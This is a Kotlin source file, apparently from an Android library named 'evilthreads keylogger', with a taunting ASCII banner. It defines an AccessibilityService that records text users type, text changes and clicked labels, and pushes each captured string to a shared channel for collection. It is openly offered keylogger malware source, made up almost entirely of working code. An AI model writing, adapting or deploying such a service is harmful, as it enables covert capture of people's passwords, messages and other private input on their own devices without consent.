/*Copyright 2020 Chris Basinger

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.*/
package com.evilthreads.keylogger

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.runBlocking
/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
class KeyloggerService: AccessibilityService() {
    override fun onInterrupt() { }
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        StringBuffer().apply {
            when(event?.eventType){
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> this.append(event.text.toString())
                AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT -> this.append(event.text.toString())
                AccessibilityEvent.TYPE_VIEW_CLICKED -> this.append(event.text.toString())
            }
        }.toString().trim().takeIf { it.isNotEmpty() }?.let{ text ->
            runBlocking {
                val entry = KeyloggerEntry(text)
                Keylogger.channel.send(entry)
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
    }
}